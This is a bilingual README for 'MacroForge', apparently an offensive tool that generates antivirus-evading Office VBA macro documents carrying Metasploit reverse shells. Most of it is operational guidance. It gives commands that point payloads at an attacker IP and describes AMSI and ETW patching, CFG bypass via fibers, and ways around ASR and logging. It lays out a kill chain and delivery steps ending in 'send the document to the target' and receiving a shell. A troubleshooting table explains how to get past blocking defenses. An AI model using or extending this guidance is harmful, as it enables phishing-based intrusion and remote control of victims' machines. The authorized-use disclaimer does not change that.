# MacroForge v3.0

一款基于 Metasploit 的免杀 VBA 宏 Payload 自动生成器，用于授权渗透测试。一条命令生成自包含 Office 宏文档，支持 **进程内 shellcode 注入**（无需 PowerShell）和 **3-stage PS1 后备**。适配 Windows 和 Kali Linux。

An AV-evasive VBA macro payload generator built on Metasploit for authorized pentesting. One command to produce self-contained Office macro documents with **in-process shellcode injection** (no PowerShell) and a **3-stage PS1 fallback**. Works on both Windows and Kali Linux.

## Features 功能

### 双模式执行引擎

- **`shellcode` 模式（默认）** — VBA 直接在 `WINWORD.exe` 进程内注入 shellcode
  - 不产生任何子进程（无 `powershell.exe`），不触发 AMSI / AppLocker / CLM / ScriptBlock 日志
  - RW→RX 两阶段内存保护（避免 RWX 启发式检测）
  - 写入后立即清零源 `Byte()` 缓冲区，消除内存中的第二份 shellcode 副本
  - 250ms Sleep 打断 `alloc→write→protect→exec` 时序特征
  - 多种触发方式：`EnumWindows` / `CertEnumSystemStore` / `EnumDateFormatsW` / **Fiber（CFG 绕过）**

- **`staged` 模式** — 经典 3-stage PS1 路径，当目标启用 "Block Win32 API calls from Office" ASR 规则时使用
  - Stage 1（落盘）：运行时构建 AMSI marker，无 `AmsiUtils` / `amsiInitFailed` 字面量
  - Stage 2（纯内存）：Add-Type P/Invoke + ETW patch
  - Stage 3（纯内存）：XOR 加密 shellcode + VirtualAlloc + CreateThread

### 反检测

- **全标识符随机** — 函数名 / 变量名 / 类名 / 命名空间 / 文件名每次生成完全不同
- **4 种 VBA 字符串加密** — Caesar / XOR / Base64 反转 / CharCode 偏移（`staged` 模式）
- **shellcode 逐字节 XOR + 分块** — 规避静态签名，分拆到多个 VBA Function 避免 64KB 编译限制
- **Callback 多样化** — 每次构建随机选择触发 API，分裂签名足迹
- **Fiber CFG 绕过** — 对 Office 16+ 启用 Control Flow Guard 的环境，`--callback fiber` 走 `CreateFiber + SwitchToFiber` 路径
- **msfvenom 编码器** — `--encoder x64/xor_dynamic` 等进一步变形 shellcode stub 字节

### 调试 & 诊断

- **`--debug` HTTP beacons** — 在 VBA 和 PS1 的每个关键节点注入 HTTP GET 埋点，精准定位死亡点
- **`--test` 诊断模式** — 无需 meterpreter，快速验证执行链：
  - `calc` — shellcode 弹计算器（验证执行）
  - `msgbox` — shellcode 弹 MessageBox（验证执行）
  - `http` — shellcode 通过 `URLDownloadToFile` 回连 HTTP 服务器（验证出站）
  - `bits` — shellcode 通过 `bitsadmin` 由 svchost 发起请求（绕过 Office 内部钩子）

### 其他

- **Stageless 载荷** — `stageless_tcp` / `stageless_https` / `stageless_http`，完整 meterpreter 嵌入 shellcode，避免二阶段下载
- **跨平台** — 自动检测 Metasploit 路径（Windows / Kali / macOS）
- **端口冲突检测** — 自动避免 HTTP 端口与 msfconsole handler 端口碰撞
- **一键运行** — `--serve --listen` 自动启动 HTTP 服务 + msfconsole

## Requirements 环境

- Python 3.6+
- Metasploit Framework（msfvenom，自动检测路径）

## Quick Start 快速开始

```bash
# 默认 shellcode 模式 (x64, reverse_tcp, 端口 4444, 进程内注入)
python MacroForge.py --lhost 10.10.16.7

# 一键全自动：生成 + HTTP beacon 服务 + msfconsole 监听 + 调试埋点
python MacroForge.py --lhost 10.10.16.7 --serve --listen --debug

# 如果目标 ASR 拦了 Win32 API calls from Office，切 staged 模式
python MacroForge.py --lhost 10.10.16.7 --mode staged --serve --listen

# CFG 环境下使用 Fiber 绕过
python MacroForge.py --lhost 10.10.16.7 --callback fiber --debug --serve --listen

# 先用诊断验证执行链再上真正 payload
python MacroForge.py --lhost 10.10.16.7 --test calc --debug --serve
```

## Usage 用法

```
python MacroForge.py --lhost <IP> [options]

必填:
  --lhost              监听 IP

执行模式:
  --mode               shellcode (默认) | staged
  --callback           enumwindows | certenumsystemstore | enumdateformatsw | fiber | random (默认)
  --test               calc | msgbox | http | bits (诊断模式，覆盖 --payload)

载荷:
  --payload            reverse_tcp (默认) | reverse_https | reverse_http | shell_tcp
                       | stageless_tcp | stageless_https | stageless_http
  --arch               x86 | x64 (默认 x64)
  --lport              监听端口 (默认 4444)
  --encoder            msfvenom 编码器 (如 x64/xor_dynamic)
  --iterations         编码迭代次数 (默认 1)

VBA 字符串加密 (staged 模式):
  --method             caesar | xor | base64 | charcode | random (默认 random)
  --shift              加密密钥 (默认自动)

网络与服务:
  --http-port          HTTP 服务端口 (默认 8080)
  --serve [PORT]       自动启动 HTTP 服务 (可选端口)
  --listen             自动启动 msfconsole handler

调试:
  --debug              注入 HTTP beacon 埋点

其他:
  --msf-path           Metasploit 路径 (默认自动检测)
  --output-dir         输出目录 (默认当前)
```

## Examples 示例

```bash
# shellcode 模式（推荐）
python MacroForge.py --lhost 10.10.16.7 --serve --listen
python MacroForge.py --lhost 10.10.16.7 --payload reverse_https --lport 443
python MacroForge.py --lhost 10.10.16.7 --callback fiber --encoder x64/xor_dynamic
python MacroForge.py --lhost 10.10.16.7 --payload stageless_https --lport 443

# staged 模式
python MacroForge.py --lhost 10.10.16.7 --mode staged --method xor --serve 8081
python MacroForge.py --lhost 10.10.16.7 --mode staged --method charcode --shift 100

# 诊断
python MacroForge.py --lhost 10.10.16.7 --test calc --debug --serve
python MacroForge.py --lhost 10.10.16.7 --test http --debug --serve
python MacroForge.py --lhost 10.10.16.7 --test bits --debug --serve
```

## Output 输出文件

### shellcode 模式

| 文件 | 说明 |
|------|------|
| `macro.vba` | 自包含 VBA 注入宏（含 XOR 加密的 shellcode），粘贴到 Word 模块即可 |
| `handler.rc` | Metasploit 资源文件 |

### staged 模式

| 文件 | 说明 |
|------|------|
| `macro.vba` | 混淆 VBA 下载宏 |
| `<random>.ps1` | Stage 1（落盘到目标 %TEMP%） |
| `<random>.txt` | Stage 2（HTTP 分发，纯内存执行） |
| `<random>.txt` | Stage 3（HTTP 分发，纯内存执行） |
| `handler.rc` | Metasploit 资源文件 |

## Steps 操作步骤

### shellcode 模式（推荐）

1. **生成** — `python MacroForge.py --lhost <IP> --serve --listen`
2. **做文档** — Word → `Alt+F11` → 插入模块 → 粘贴 `macro.vba` → 存为 `.doc`/`.docm`
3. **投递** — 发送文档给目标
4. **收 shell** — msfconsole 自动监听

### staged 模式

1. **生成** — `python MacroForge.py --lhost <IP> --mode staged --serve --listen`
2. **做文档** — 同上
3. **投递** — 同上（目标打开后宏自动下载 PS1 并执行）

## Kill Chain 攻击链

### shellcode 模式

```
目标打开 Word → AutoOpen() 触发
→ 多 Function 拼接 hex 字符串
→ XOR 逐字节解密还原 shellcode
→ VirtualAlloc(RW) → RtlMoveMemory 写入
→ 清零源缓冲区 → Sleep 250ms
→ VirtualProtect(RX)
→ Callback API / Fiber 触发执行
→ Meterpreter 在 WINWORD.exe 进程内回连
```

### staged 模式

```
目标打开 Word → AutoOpen() 触发
→ 混淆解密还原字符串 → XMLHTTP 下载 Stage 1 PS1
→ 写入 %TEMP% → WMI 启动 PowerShell (父进程 WMI 非 Word)
→ Stage 1: 运行时 AMSI bypass → IEX 拉取 Stage 2
→ Stage 2: Add-Type + ETW patch → IEX 拉取 Stage 3
→ Stage 3: XOR 解密 shellcode → VirtualAlloc → CreateThread
→ Meterpreter 反弹
```

## Debugging 调试流程

使用 `--debug` 后 HTTP 日志会显示 beacon 埋点序列：

```
[BEACON-VBA] start              → 宏进入主函数
[BEACON-VBA] built_<len>        → hex 拼接完成 (shellcode mode)
[BEACON-VBA] decoded_<n>        → XOR 解密完成
[BEACON-VBA] alloc_rw_<addr>    → VirtualAlloc(RW) 成功
[BEACON-VBA] copied             → RtlMoveMemory 完成
[BEACON-VBA] erased             → 源缓冲区清零
[BEACON-VBA] protect_rx_ret_<>  → VirtualProtect(RX) 完成
[BEACON-VBA] invoke_<api>       → 即将通过 callback 触发
[BEACON-VBA] executed           → callback 返回
```

缺失哪条 beacon 就知道死在哪一步，参考对照表：

| 最后出现的 beacon | 死因 | 处置 |
|---|---|---|
| 无任何 beacon | 宏未执行 | 检查宏安全设置 / Trust Center |
| `start` 但无 `built_*` | chunk 函数读取失败 | 代码截断 / VBA 编译错误 |
| `alloc_rw_0` | VirtualAlloc 返回 NULL | ASR 规则阻止 Win32 API → 改用 `--mode staged` |
| `protect_rx_ret_*` 但无 `invoke_*` | 到 protect 正常 | 少见，代码问题 |
| `invoke_*` 但无 session | **CFG 杀死了回调地址** | `--callback fiber` 绕过 CFG |
| `invoke_*` + session 建立 | 成功 | — |

## Evasion 免杀总结

| 层级 | shellcode 模式 | staged 模式 |
|------|------|------|
| 进程链 | 无子进程，所有操作在 WINWORD.exe 内 | WMI 断链 (Word → WMI → PS) |
| 文档层 | shellcode XOR 加密 + hex 分块嵌入 VBA | 无 shellcode，仅含混淆下载器 |
| 字符串层 | 无明文敏感字符串 | 4 种加密随机切换 |
| 标识符层 | 函数名/变量名/Declare 别名每次随机 | 同左 |
| 内存层 | RW→RX 两阶段 + 源缓冲区清零 + Sleep 打断时序 | 由 PS1 处理 |
| 触发层 | 多种 callback API / Fiber CFG bypass | CreateThread |
| AMSI | 不涉及 (VBA 不走 AMSI) | 运行时构建 marker 绕过 |
| ETW | 不涉及 | ntdll!EtwEventWrite patch |
| 载荷层 | 逐字节 XOR + 可选 msfvenom encoder | XOR 加密 shellcode |

## Disclaimer 免责声明

本工具仅用于授权渗透测试和安全教育。未经授权对非自有系统使用属于违法行为。

This tool is for authorized penetration testing only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
